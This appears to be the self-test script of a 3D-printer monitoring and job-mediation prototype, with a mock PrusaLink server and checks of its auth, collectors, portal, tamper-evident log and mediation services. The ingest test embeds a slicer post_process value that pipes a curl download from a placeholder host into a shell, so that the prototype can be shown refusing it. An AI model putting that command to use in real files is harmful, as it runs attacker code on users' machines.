#!/usr/bin/env python3
"""
tools/selftest.py -- exercise the whole prototype without any hardware.

    python3 -m solution.tools.selftest

Runs against a throwaway data directory, so it cannot touch a live database or
event log. Checks:

  1. A mock PrusaLink server, HTTP Digest and all, answering with the shapes
     from the published OpenAPI spec -- this is what validates the real
     adapter rather than the simulator.
  2. Each collector, standalone, against the simulator and the mock.
  3. Repository change detection across an add, a modify and a delete.
  4. The portal: sign-in, artifact approval, finding acknowledgement,
     manifest revocation, chain verification -- and that each one lands in
     the event log against the operator's name.
  5. Tamper-evidence: edit a record in the middle of the log and confirm the
     chain verification catches it.

Exit code is non-zero if anything fails.
"""

from __future__ import annotations

import hashlib
import io
import json
import os
import shutil
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PASS, FAIL = [], []


def check(label: str, ok: bool, detail: str = "") -> bool:
    (PASS if ok else FAIL).append(label)
    print(f"  [{'PASS' if ok else 'FAIL'}] {label}" + (f"  -- {detail}" if detail else ""))
    return ok


# =============================================================================
# mock PrusaLink
# =============================================================================

REALM = "Printer API"
MOCK_USER, MOCK_PASS = "maker", "s3cret-link-pw"
_FILES = {
    "/bracket_v3.bgcode": b"AUTHORIZED-BRACKET-V3-" + b"g" * 512,
    "/sub/rogue_part.bgcode": b"PULLED-FROM-THE-INTERNET-" + b"q" * 777,
}
# what the mock machine is currently printing; a PUT with Print-After-Upload
# or a POST to a file sets it, so the mediated round trip can be observed
_STATE = {"printing": "/sub/rogue_part.bgcode"}


def _md5(s: str) -> str:
    return hashlib.md5(s.encode()).hexdigest()


class MockPrusaLink(BaseHTTPRequestHandler):
    """
    Minimal PrusaLink. Enforces HTTP Digest exactly as the spec's single
    security scheme requires, so the client's auth path is genuinely
    exercised rather than assumed.
    """
    protocol_version = "HTTP/1.1"
    nonce = "deadbeefcafe"

    def log_message(self, *a):
        pass

    def _challenge(self):
        # Drain the request body before answering. On a keep-alive connection
        # an unread PUT body is left in the socket, and the server then reads
        # those bytes as the start of the next request -- which is how a 401
        # challenge turns into a bogus 501 on the retry.
        n = int(self.headers.get("Content-Length") or 0)
        if n:
            self.rfile.read(n)
        self.send_response(401)
        self.send_header("WWW-Authenticate",
                         f'Digest realm="{REALM}", qop="auth", nonce="{self.nonce}", '
                         f'opaque="0000", algorithm=MD5')
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _authorized(self) -> bool:
        hdr = self.headers.get("Authorization", "")
        if not hdr.startswith("Digest "):
            return False
        parts = {}
        for item in hdr[7:].split(","):
            if "=" in item:
                k, v = item.strip().split("=", 1)
                parts[k.strip()] = v.strip().strip('"')
        ha1 = _md5(f"{MOCK_USER}:{REALM}:{MOCK_PASS}")
        ha2 = _md5(f"{self.command}:{parts.get('uri', '')}")
        want = _md5(f"{ha1}:{parts.get('nonce','')}:{parts.get('nc','')}:"
                    f"{parts.get('cnonce','')}:{parts.get('qop','')}:{ha2}")
        return parts.get("response") == want and parts.get("username") == MOCK_USER

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _bytes(self, blob: bytes):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(blob)))
        self.end_headers()
        self.wfile.write(blob)

    def _404(self):
        self.send_response(404)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_PUT(self):
        if not self._authorized():
            return self._challenge()
        p = self.path.split("?")[0]
        if not p.startswith("/api/v1/files/usb"):
            return self._404()
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else b""
        rel = p[len("/api/v1/files/usb"):] or "/"
        overwrite = (self.headers.get("Overwrite", "?0") == "?1")
        if rel in _FILES and not overwrite:
            self.send_response(409); self.send_header("Content-Length", "0")
            return self.end_headers()
        _FILES[rel] = body
        if self.headers.get("Print-After-Upload") == "?1":
            _STATE["printing"] = rel
        return self._json({"name": rel.rsplit("/", 1)[-1], "size": len(body)}, 201)

    def do_POST(self):
        if not self._authorized():
            return self._challenge()
        p = self.path.split("?")[0]
        if p.startswith("/api/v1/files/usb"):
            rel = p[len("/api/v1/files/usb"):]
            if rel not in _FILES:
                return self._404()
            _STATE["printing"] = rel
            self.send_response(204); self.send_header("Content-Length", "0")
            return self.end_headers()
        return self._404()

    def do_GET(self):
        if not self._authorized():
            return self._challenge()
        p = self.path.split("?")[0]

        if p == "/api/version":
            return self._json({"api": "2.0.0", "server": "2.1.2",
                               "text": "PrusaLink", "firmware": "6.2.0",
                               "hostname": "mk4-mock"})
        if p == "/api/v1/info":
            return self._json({"name": "MK4 mock", "serial": "CZPX0000X000XK00000",
                               "hostname": "mk4-mock", "nozzle_diameter": 0.4,
                               "sd_ready": True, "location": "bay 1",
                               "farm_mode": False, "mmu": False})
        if p == "/api/v1/status":
            return self._json({
                "printer": {"state": "PRINTING" if _STATE.get("printing") else "IDLE",
                            "temp_nozzle": 215.3,
                            "target_nozzle": 215.0, "temp_bed": 60.1,
                            "target_bed": 60.0, "axis_z": 7.4, "flow": 100,
                            "speed": 100,
                            "status_printer": {"ok": True, "message": "OK"},
                            "status_connect": {"ok": False, "message": "Off"}},
                "job": {"id": 91, "progress": 42.0, "time_remaining": 1800,
                        "time_printing": 1300},
                "storage": {"name": "usb", "path": "/usb/", "read_only": False,
                            "free_space": 1234567}})
        if p == "/api/v1/job":
            cur = _STATE.get("printing")
            if not cur:
                return self._404()
            blob = _FILES.get(cur, b"")
            name = cur.rsplit("/", 1)[-1]
            return self._json({
                "id": 91, "state": "PRINTING", "progress": 42.0,
                "time_remaining": 1800, "time_printing": 1300,
                "inaccurate_estimates": False,
                "file": {"name": name, "display_name": name,
                         "path": cur, "display_path": f"/usb{cur}",
                         "size": len(blob), "m_timestamp": 1750000000,
                         "refs": {"download": f"/api/v1/files/usb{cur}"}}})
        if p == "/api/v1/storage":
            return self._json({"storage_list": [
                {"name": "usb", "path": "/usb/", "type": "USB",
                 "read_only": False, "available": True, "free_space": 1234567}]})

        if p.startswith("/api/v1/files/usb"):
            rel = p[len("/api/v1/files/usb"):] or "/"
            if rel in _FILES:
                return self._bytes(_FILES[rel])
            # directory listing: children carry name but NOT path, which is
            # the spec behaviour the adapter has to compose around
            # Directory listing, synthesised from the flat file map so that
            # anything uploaded into a new directory (the mediated variant
            # writes into /fabguard) is listed like a real machine would.
            # Children carry `name` but NOT `path` -- the spec behaviour the
            # adapter has to compose around.
            prefix = rel if rel.endswith("/") else rel + "/"
            kids, seen_dirs = [], set()
            for path, blob in sorted(_FILES.items()):
                if not path.startswith(prefix):
                    continue
                tail = path[len(prefix):]
                if "/" in tail:
                    d = tail.split("/", 1)[0]
                    if d not in seen_dirs:
                        seen_dirs.add(d)
                        kids.append({"name": d, "type": "FOLDER",
                                     "read_only": False, "m_timestamp": 1750000000})
                else:
                    kids.append({"name": tail, "type": "PRINT_FILE",
                                 "size": len(blob), "m_timestamp": 1750000000,
                                 "read_only": False,
                                 "refs": {"download": f"/api/v1/files/usb{path}"}})
            if not kids and rel != "/":
                return self._404()
            return self._json({"name": rel.rstrip("/").rsplit("/", 1)[-1] or "usb",
                               "type": "FOLDER", "read_only": False,
                               "m_timestamp": 1750000000, "children": kids})
        return self._404()


def start_mock() -> tuple[ThreadingHTTPServer, int]:
    srv = ThreadingHTTPServer(("127.0.0.1", 0), MockPrusaLink)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]


# =============================================================================
# the run
# =============================================================================

def main() -> int:
    tmp = tempfile.mkdtemp(prefix="fabguard-selftest-")
    os.environ["FABGUARD_DATA_DIR"] = str(os.path.join(tmp, "data"))

    # config must be imported only after the data dir is redirected
    from .. import config
    from ..core import db, eventlog, identity, registry
    from ..core import services as svc_registry

    repo_root = os.path.join(tmp, "repo")
    os.makedirs(os.path.join(repo_root, "projects"), exist_ok=True)
    from pathlib import Path
    config.REPOSITORY_PATH = Path(repo_root)
    config.INVENTORY_ENABLE_SWEEP = False
    config.ARTIFACT_RETAIN_COPIES = True

    srv, port = start_mock()
    config.PRINTERS = [
        {"id": "mk4-mock", "label": "MK4 (mock)", "driver": "prusalink",
         "host": "127.0.0.1", "port": port, "username": MOCK_USER,
         "password": MOCK_PASS,
         "storages": ["usb"], "timeout_s": 5.0},
        {"id": "sim-01", "label": "Simulated", "driver": "simulator",
         "scenario": "unauthorized_usb_print"},
    ]

    print(f"\nscratch   {tmp}")
    print(f"mock      http://127.0.0.1:{port}  (HTTP Digest, user '{MOCK_USER}')\n")
    db.connect()
    identity.ensure_bootstrap_user()

    # -- 1. the adapter against a spec-shaped server ----------------------
    print("1. PrusaLink adapter against the mock")
    from ..adapters import build_printer
    pr = build_printer(config.PRINTERS[0])
    try:
        check("digest auth negotiated (GET /api/version)", pr.ping())
        v = pr.version()
        check("version parsed", v.get("firmware") == "6.2.0", f"firmware={v.get('firmware')}")
        ident = pr.identity()
        check("identity parsed", ident.get("serial") == "CZPX0000X000XK00000",
              f"serial={ident.get('serial')}")
        snap = pr.snapshot()
        check("status + job merged", snap["state"] == "PRINTING"
              and snap["file_name"] == "rogue_part.bgcode"
              and snap["job_id"] == "91",
              f"state={snap['state']} file={snap['file_name']} job={snap['job_id']}")
        files = pr.walk("usb")
        paths = sorted(f["path"] for f in files)
        check("recursive walk composes child paths",
              paths == ["/bracket_v3.bgcode", "/sub/rogue_part.bgcode"], str(paths))
        blob = pr.download("usb", "/sub/rogue_part.bgcode", 10_000_000)
        check("download returns exact bytes", blob == _FILES["/sub/rogue_part.bgcode"],
              f"{len(blob)} bytes")
        try:
            pr.download("usb", "/sub/rogue_part.bgcode", 10)
            check("download cap enforced", False, "oversize download was allowed")
        except Exception:
            check("download cap enforced", True)
    except Exception as exc:
        check("adapter exercised without raising", False, f"{type(exc).__name__}: {exc}")

    # bad credentials must fail loudly, not silently return nothing
    bad = build_printer({**config.PRINTERS[0], "id": "bad", "password": "wrong"})
    check("wrong digest password is rejected", not bad.ping())

    # -- 2. collectors -----------------------------------------------------
    print("\n2. Collectors")
    for name in ("fabrication_activity", "artifact_verification", "equipment_inventory"):
        try:
            res = registry.load(name).run_once("selftest")
            check(f"{name} ran", True, res.summary)
        except Exception as exc:
            check(f"{name} ran", False, f"{type(exc).__name__}: {exc}")

    jobs = db.q("SELECT * FROM fabrication_job")
    check("unauthorized fabrication observed on both machines", len(jobs) == 2,
          f"{len(jobs)} job(s): " + ", ".join(j["file_name"] or "?" for j in jobs))
    check("every observed job is unreconciled (no authorization source yet)",
          all(j["reconciled"] == 0 for j in jobs))

    arts = db.q("SELECT * FROM equipment_artifact ORDER BY path")
    check("artifacts enumerated from both machines", len(arts) == 4,
          f"{len(arts)}: " + ", ".join(a["path"] for a in arts))
    check("all unrecognised against an empty manifest",
          all(a["verdict"] == "UNRECOGNIZED" for a in arts),
          ", ".join(f"{a['path']}={a['verdict']}" for a in arts))
    known = hashlib.sha256(_FILES["/bracket_v3.bgcode"]).hexdigest()
    check("hash of a downloaded artifact is correct",
          any(a["sha256"] == known for a in arts))

    # -- 3. repository change detection ------------------------------------
    print("\n3. Repository change detection")
    p = config.REPOSITORY_PATH
    (p / "projects" / "bracket.3mf").write_text("bracket v1")
    (p / "projects" / "mount.stl").write_text("mount v1")
    (p / "notes.txt").write_text("notes")
    res = registry.load("repository_change").run_once("selftest")
    check("baseline snapshot taken", res.counts.get("baseline") == 1, res.summary)
    check("no findings raised on the baseline", res.findings == 0,
          f"{res.findings} finding(s)")

    time.sleep(1.1)                      # mtime resolution
    (p / "projects" / "bracket.3mf").write_text("bracket v2 CHANGED")
    (p / "projects" / "newpart.stl").write_text("new")
    (p / "notes.txt").unlink()
    res = registry.load("repository_change").run_once("selftest")
    check("add/modify/delete all detected",
          res.counts.get("added") == 1 and res.counts.get("modified") == 1
          and res.counts.get("deleted") == 1, res.summary)
    mod = db.q1("SELECT * FROM repo_change WHERE change='MODIFIED'")
    check("modification recorded with both hashes",
          bool(mod and mod["old_sha256"] and mod["new_sha256"]
               and mod["old_sha256"] != mod["new_sha256"]))
    check("deleted path removed from the tracked set",
          db.q1("SELECT COUNT(*) n FROM repo_entry WHERE path='notes.txt'")["n"] == 0)

    # -- 4. the portal -----------------------------------------------------
    print("\n4. Portal")
    from ..web.app import create_app
    app = create_app(scheduler=None)
    app.config["TESTING"] = True
    c = app.test_client()

    r = c.get("/", follow_redirects=False)
    check("unauthenticated request redirects to sign-in",
          r.status_code == 302 and "/login" in r.headers.get("Location", ""))

    def csrf(path="/login"):
        import re as _re
        html = c.get(path).get_data(as_text=True)
        m = _re.search(r'name="_csrf" value="([^"]+)"', html)
        return m.group(1) if m else ""

    r = c.post("/login", data={"username": config.BOOTSTRAP_USER,
                               "password": "definitely-wrong", "_csrf": csrf()},
               follow_redirects=True)
    check("bad password is refused", b"Invalid credentials" in r.data)

    r = c.post("/login", data={"username": config.BOOTSTRAP_USER,
                               "password": config.BOOTSTRAP_PASSWORD,
                               "_csrf": csrf()}, follow_redirects=True)
    check("sign-in succeeds", b"Dashboard" in r.data)

    r = c.post("/run/fabrication_activity", data={}, follow_redirects=True)
    check("POST without a CSRF token is rejected", r.status_code == 400)

    for path in ("/", "/findings", "/activity", "/artifacts", "/repository",
                 "/equipment", "/manifest", "/events", "/account"):
        rr = c.get(path)
        if not check(f"GET {path}", rr.status_code == 200, f"HTTP {rr.status_code}"):
            print(rr.get_data(as_text=True)[:600])

    # approve an artifact -- the attributed action that matters most
    art = db.q1("SELECT * FROM equipment_artifact WHERE verdict='UNRECOGNIZED' LIMIT 1")
    c.post(f"/artifacts/{art['id']}/approve",
           data={"note": "known good, bench test", "_csrf": csrf("/artifacts")},
           follow_redirects=True)
    m = db.q1("SELECT * FROM manifest WHERE sha256=?", (art["sha256"],))
    check("approval wrote a manifest entry", m is not None)
    check("manifest entry names the operator",
          bool(m) and m["approved_by"] == config.BOOTSTRAP_USER,
          f"approved_by={m['approved_by'] if m else None}")

    evs = eventlog.read_all()
    appr = [e for e in evs if e["kind"] == "manifest.approved"]
    check("approval is in the event log against the operator",
          len(appr) == 1 and appr[0]["actor"] == config.BOOTSTRAP_USER,
          f"actor={appr[0]['actor'] if appr else None}")

    # re-verify: the approved artifact should now read AUTHORIZED
    registry.load("artifact_verification").run_once("selftest")
    again = db.q1("SELECT * FROM equipment_artifact WHERE id=?", (art["id"],))
    check("approved artifact now verifies as authorized",
          again["verdict"] == "AUTHORIZED", f"verdict={again['verdict']}")

    # altered-artifact detection: same name, different bytes
    _FILES["/bracket_v3.bgcode"] = b"TAMPERED-" + b"z" * 600
    with db.tx() as conn:
        conn.execute("UPDATE equipment_artifact SET m_timestamp=m_timestamp+1"
                     " WHERE path='/bracket_v3.bgcode'")
    mname = db.q1("SELECT * FROM manifest LIMIT 1")
    with db.tx() as conn:
        conn.execute("UPDATE manifest SET name='bracket_v3.bgcode' WHERE id=?",
                     (mname["id"],))
    registry.load("artifact_verification").run_once("selftest")
    alt = db.q1("SELECT * FROM equipment_artifact WHERE path='/bracket_v3.bgcode'")
    check("approved name with unapproved contents flags as ALTERED",
          alt["verdict"] == "ALTERED", f"verdict={alt['verdict']}")

    fid = db.q1("SELECT id FROM finding WHERE acknowledged_ts IS NULL LIMIT 1")
    c.post(f"/findings/{fid['id']}/ack", data={"note": "reviewed", "_csrf": csrf("/findings")},
           follow_redirects=True)
    ack = db.q1("SELECT * FROM finding WHERE id=?", (fid["id"],))
    check("finding acknowledgement is attributed",
          ack["acknowledged_by"] == config.BOOTSTRAP_USER,
          f"by={ack['acknowledged_by']}")

    c.post(f"/manifest/{m['id']}/revoke",
           data={"reason": "superseded", "_csrf": csrf("/manifest")},
           follow_redirects=True)
    rev = db.q1("SELECT * FROM manifest WHERE id=?", (m["id"],))
    check("revocation is attributed",
          rev["revoked"] == 1 and rev["revoked_by"] == config.BOOTSTRAP_USER)

    # -- 5. tamper-evidence -----------------------------------------------
    print("\n5. Append-only event log")
    v = eventlog.verify()
    check("chain verifies clean", v["ok"], v["reason"])
    check("log contains records from every feature",
          {"fabrication_activity", "artifact_verification", "repository_change",
           "equipment_inventory", "portal", "identity"}
          <= {e["feature"] for e in eventlog.read_all()})

    lines = config.EVENT_LOG_PATH.read_text().splitlines()
    n = len(lines)
    victim = json.loads(lines[n // 2])
    victim["actor"] = "somebody-else"
    lines[n // 2] = json.dumps(victim, sort_keys=True)
    config.EVENT_LOG_PATH.write_text("\n".join(lines) + "\n")
    v2 = eventlog.verify()
    check("editing a record in the middle breaks verification", not v2["ok"], v2["reason"])
    check("the altered record is the one identified",
          v2["first_bad_seq"] == victim["seq"],
          f"reported seq {v2['first_bad_seq']}, altered seq {victim['seq']}")

    config.EVENT_LOG_PATH.write_text("\n".join(
        l for i, l in enumerate(lines) if i != n // 2) + "\n")
    v3 = eventlog.verify()
    check("deleting a record also breaks verification", not v3["ok"], v3["reason"])

    # -- 6. mediated variant ----------------------------------------------
    print("\n6. Mediated variant")
    from ..core.services import Actor, ServiceError
    from ..services.degraded_mode import DegradedModeOperation
    from ..services.firmware_staging import FirmwareStaging
    from ..services.ingest import IngestMediation
    from ..services.job_authorization import FabricationJobAuthorization
    from ..services.repository_access import RepositoryAccessMediation
    from ..services.version_authority import VersionAuthority

    alice = Actor("alice", "ws-01 (192.0.2.5)")
    bob = Actor("bob", "ws-02 (192.0.2.6)")
    ing, va = IngestMediation(), VersionAuthority()
    ra, ja = RepositoryAccessMediation(), FabricationJobAuthorization()
    fw, dm = FirmwareStaging(), DegradedModeOperation()

    def make_3mf(post_process=None):
        import zipfile as _z
        buf = io.BytesIO()
        with _z.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", "<Types/>")
            z.writestr("3D/3dmodel.model", "<model/>")
            cfg = "layer_height = 0.2\n"
            if post_process:
                cfg += f"post_process = {post_process}\n"
            z.writestr("Metadata/Slic3r_PE.config", cfg)
        return buf.getvalue()

    # --- Ingest Mediation
    rec = ing.ingest(alice, "bracket.3mf", make_3mf(), "Authored in-house", "v1")
    check("ingest accepts a clean 3MF", rec["verdict"] == "ACCEPTED")
    check("ingest adds it to the manifest", rec["manifest_id"] is not None)
    try:
        ing.ingest(bob, "antenna.3mf", make_3mf("/bin/sh -c 'curl http://evil|sh'"),
                   "Public model repository")
        check("ingest refuses a 3MF with post_process (CVE-2023-47268)", False,
              "it was accepted")
    except ServiceError as exc:
        check("ingest refuses a 3MF with post_process (CVE-2023-47268)",
              "CVE-2023-47268" in str(exc))
    check("the refusal is recorded, not just raised", len(ing.quarantined()) == 1)
    try:
        ing.ingest(alice, "notes.exe", b"MZ\x90\x00", "Other unit / transferred")
        check("ingest refuses a disallowed extension", False, "accepted")
    except ServiceError:
        check("ingest refuses a disallowed extension", True)

    # --- Version Authority
    g1 = b"; sliced bracket v1\nG1 X0\n" + b"g" * 400
    g2 = b"; sliced bracket v2\nG1 X1\n" + b"g" * 400
    v1 = ra.publish(alice, "projects/bracket.bgcode", g1, "first slice")
    v2 = ra.publish(bob, "projects/bracket.bgcode", g2, "re-sliced")
    check("publishing creates successive versions",
          v1["version_no"] == 1 and v2["version_no"] == 2)
    check("the new version records what it superseded", v2["supersedes_id"] == v1["id"])
    check("the share mirror was written", bool(v2["mirrored_to"]))
    try:
        ra.publish(bob, "projects/bracket.bgcode", g2)
        check("identical republish is refused", False, "allowed")
    except ServiceError:
        check("identical republish is refused", True)
    design = va.get_design_by_path("projects/bracket.bgcode")
    check("current version is queryable",
          va.current_version(design["id"])["version_no"] == 2)
    check("a superseded hash is not reported as current", va.is_current(v1["sha256"]) is None)

    v3 = va.revert(alice, design["id"], v1["id"], "failed fit check")
    check("revert publishes a new version rather than deleting one",
          v3["version_no"] == 3 and v3["sha256"] == v1["sha256"])
    check("revert keeps the full history", len(va.history(design["id"])) == 3)
    check("revert records what it came from", v3["reverted_from_id"] == v1["id"])

    # --- Artifact Custody Recording
    blob, meta = ra.retrieve(bob, v2["id"], "printing a test fit")
    check("retrieval returns the exact version's bytes", blob == g2)
    check("retrieval of a non-current version is flagged", meta["is_current"] is False,
          "v2 is no longer current after the revert")
    log = ra.custody_log()
    check("custody records the operator and the device",
          any(r["operator"] == "bob" and "ws-02" in (r["device"] or "")
              and r["action"] == "RETRIEVE" for r in log))
    check("who_had() answers for a specific hash",
          len(ra.who_had(v2["sha256"])) >= 2)

    # --- Fabrication Job Authorization
    try:
        ja.submit(alice, "mk4-mock", version_id=v2["id"])
        check("a job for an unmanifested artifact is refused", False, "allowed")
    except ServiceError as exc:
        check("a job for an unmanifested artifact is refused",
              "manifest" in str(exc).lower())

    for blobx, vx in ((g1, v1), (g2, v2)):
        with db.tx() as conn:
            conn.execute("INSERT OR IGNORE INTO manifest(sha256,size,name,source_path,"
                         "note,approved_by,approved_ts) VALUES (?,?,?,?,?,?,?)",
                         (vx["sha256"], len(blobx), "bracket.bgcode", "selftest", "",
                          "alice", db.now()))
    try:
        ja.submit(alice, "mk4-mock", version_id=v2["id"])
        check("a superseded version is refused without an override", False, "allowed")
    except ServiceError as exc:
        check("a superseded version is refused without an override",
              "superseded" in str(exc).lower())

    current = va.current_version(design["id"])
    job = ja.submit(alice, "mk4-mock", version_id=current["id"], note="test fit",
                    print_after_upload=True)
    check("the current version transfers", job["status"] == "TRANSFERRED",
          f"status={job['status']}")
    check("the authorization names the operator and device",
          job["operator"] == "alice" and "ws-01" in (job["device"] or ""))
    job2 = ja.submit(bob, "mk4-mock", version_id=v2["id"], allow_superseded=True,
                     note="reprint for a fielded assembly")
    check("a superseded version transfers WITH an override",
          job2["status"] == "TRANSFERRED" and "superseded override" in (job2["note"] or ""))

    # --- Fabrication Job Reconciliation
    registry.load("fabrication_activity").run_once("selftest")
    registry.load("artifact_verification").run_once("selftest")
    res = registry.load("job_reconciliation").run_once("selftest")
    check("the authorized job reconciles by content hash",
          res.counts.get("by_hash", 0) >= 1, res.summary)
    matched = db.q1("SELECT * FROM fabrication_job WHERE authorized=1 LIMIT 1")
    check("the observed job is linked to its authorization",
          bool(matched and (matched["authorization_ref"] or "").startswith("auth:")),
          matched["authorization_ref"] if matched else "none")

    sim_unauth = db.q1("SELECT * FROM fabrication_job WHERE printer_id='sim-01'")
    check("the simulator's unauthorized print is still unauthorized",
          bool(sim_unauth) and sim_unauth["authorized"] == 0)
    check("an unauthorized job raises a critical finding",
          bool(db.q1("SELECT 1 FROM finding WHERE kind='job.unauthorized'")))

    # --- Degraded-Mode Operation
    ex = dm.open(alice, "Mediating service unavailable", "PSU failure", minutes=120)
    check("a break-glass exception opens", bool(dm.active()))
    try:
        dm.open(bob, "Other (describe)", "second", minutes=30)
        check("a second overlapping exception is refused", False, "allowed")
    except ServiceError:
        check("a second overlapping exception is refused", True)
    try:
        dm.extend(alice, ex["id"], config.DEGRADED_MAX_MINUTES)
        check("extending past the maximum is refused", False, "allowed")
    except ServiceError:
        check("extending past the maximum is refused", True)

    with db.tx() as conn:
        conn.execute("INSERT INTO fabrication_job(printer_id, job_key, job_id,"
                     " file_name, first_seen_ts, last_seen_ts, end_state)"
                     " VALUES (?,?,?,?,?,?,?)",
                     ("sim-01", "sim-01:99:urgent.bgcode", "99", "urgent.bgcode",
                      db.now(), db.now(), "FINISHED"))
    res = registry.load("job_reconciliation").run_once("selftest")
    check("a job during the window is accounted to the exception",
          res.counts.get("exception", 0) == 1, res.summary)
    tagged = db.q1("SELECT * FROM fabrication_job WHERE job_key='sim-01:99:urgent.bgcode'")
    check("an exception accounts for a job without authorizing it",
          tagged["exception_id"] == ex["id"] and tagged["authorized"] == 0)

    closed = dm.close(alice, ex["id"], "service restored")
    check("closing counts the jobs observed in the window",
          closed["jobs_observed"] >= 1, f"{closed['jobs_observed']}")
    check("closing without reconciling raises a finding",
          bool(db.q1("SELECT 1 FROM finding WHERE kind='degraded.unreconciled'")))
    dm.reconcile(alice, ex["id"], "one urgent bracket, confirmed")
    check("reconciliation is attributed",
          dm.get(ex["id"])["reconciled_by"] == "alice")

    from datetime import datetime as _dt, timedelta as _td, timezone as _tz
    stale = (_dt.now(_tz.utc) - _td(hours=6)).isoformat(timespec="seconds").replace("+00:00", "Z")
    gone = (_dt.now(_tz.utc) - _td(hours=4)).isoformat(timespec="seconds").replace("+00:00", "Z")
    with db.tx() as conn:
        conn.execute("INSERT INTO degraded_exception(opened_ts, opened_by, reason,"
                     " expires_ts) VALUES (?,?,?,?)",
                     (stale, "bob", "Network partition to equipment", gone))
    check("an expired but still-open exception is caught", dm.check_overdue() == 1)

    # --- Firmware Staging
    img = fw.record(alice, "MK4_6.2.0.bbf", b"BBF\x00" + b"\xa5" * 2048,
                    version_label="6.2.0", note="prusa3d.com")
    check("a firmware image is recorded", img["sha256"] is not None)
    try:
        fw.record(alice, "firmware.zip", b"PK\x03\x04")
        check("a non-.bbf firmware image is refused", False, "accepted")
    except ServiceError:
        check("a non-.bbf firmware image is refused", True)
    staged = fw.stage(alice, "mk4-mock", img["id"], "bay 1")
    check("staging verifies by reading the image back off the machine",
          staged["verified"], staged["detail"])
    # The mock reports firmware 6.2.0, so a declaration of 6.2.0 should agree
    # and a declaration of anything else should not. Both directions matter:
    # a check that only fires one way would pass while flagging everything.
    applied = fw.declare_applied(alice, "mk4-mock", img["id"], "applied at the panel")
    check("a declared version matching the machine is not flagged",
          applied["mismatch"] is False,
          f"declared 6.2.0, machine reports {applied['observed']}")

    wrong = fw.record(bob, "MK4_7.0.0.bbf", b"BBF\x00" + b"\xb6" * 2048,
                      version_label="7.0.0", note="wrong label on purpose")
    applied2 = fw.declare_applied(bob, "mk4-mock", wrong["id"], "claimed 7.0.0")
    check("a declared version that disagrees with the machine is flagged",
          applied2["mismatch"] is True,
          f"declared 7.0.0, machine reports {applied2['observed']}")
    check("the disagreement raises a finding",
          bool(db.q1("SELECT 1 FROM finding WHERE kind='firmware.version_mismatch'")))
    evs_fw = fw.events()
    check("every firmware event names an operator and a device",
          all(e["operator"] and e["device"] for e in evs_fw),
          f"{len(evs_fw)} event(s)")
    check("firmware events attribute to whoever did them",
          {"alice", "bob"} <= {e["operator"] for e in evs_fw},
          str(sorted({e["operator"] for e in evs_fw})))

    # --- Operator Attribution
    evs = eventlog.read_all()
    with_device = [e for e in evs if e.get("data", {}).get("device")]
    check("mediation events carry the device alongside the operator",
          len(with_device) >= 8, f"{len(with_device)} event(s) carry a device")
    check("the operator is the event actor, not the device",
          all(e["actor"] in ("alice", "bob", "operator", "system",
                             "system:bootstrap", "tools.adduser")
              or e["actor"].startswith("service:") or e["actor"].startswith("portal:")
              for e in evs if e.get("data", {}).get("device")))

    # -- 7. observational variant -------------------------------------------
    print("\n7. Observational variant")
    config.VARIANT = "observational"
    config.MEDIATED = False
    config.ENABLED_SERVICES = []
    config.ENABLED_FEATURES = [f for f in config.ENABLED_FEATURES
                               if f != "job_reconciliation"]
    check("no mediation services load", svc_registry.load_enabled() == {})
    try:
        IngestMediation().ingest(alice, "x.3mf", make_3mf(), "Authored in-house")
        check("a mediation call refuses in the observational variant", False, "allowed")
    except ServiceError as exc:
        check("a mediation call refuses in the observational variant",
              "observational" in str(exc))

    app2 = create_app(scheduler=None)
    app2.config["TESTING"] = True
    c2 = app2.test_client()
    import re as _re
    tok = _re.search(r'name="_csrf" value="([^"]+)"',
                     c2.get("/login").get_data(as_text=True)).group(1)
    c2.post("/login", data={"username": config.BOOTSTRAP_USER,
                            "password": config.BOOTSTRAP_PASSWORD, "_csrf": tok},
            follow_redirects=True)
    codes = {p: c2.get(p).status_code for p in
             ("/ingest", "/designs", "/jobs", "/firmware", "/custody", "/degraded")}
    check("mediated routes are absent, not merely disabled",
          all(v == 404 for v in codes.values()), str(codes))
    check("shared routes still work",
          all(c2.get(p).status_code == 200 for p in
              ("/", "/activity", "/artifacts", "/repository", "/equipment", "/events")))

    config.VARIANT = "mediated"
    config.MEDIATED = True

    # -- done --------------------------------------------------------------
    srv.shutdown()
    print(f"\n{'=' * 64}")
    print(f"{len(PASS)} passed, {len(FAIL)} failed")
    if FAIL:
        for f in FAIL:
            print(f"  FAILED: {f}")
    print(f"{'=' * 64}")
    if not FAIL:
        shutil.rmtree(tmp, ignore_errors=True)
    else:
        print(f"scratch kept for inspection: {tmp}")
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
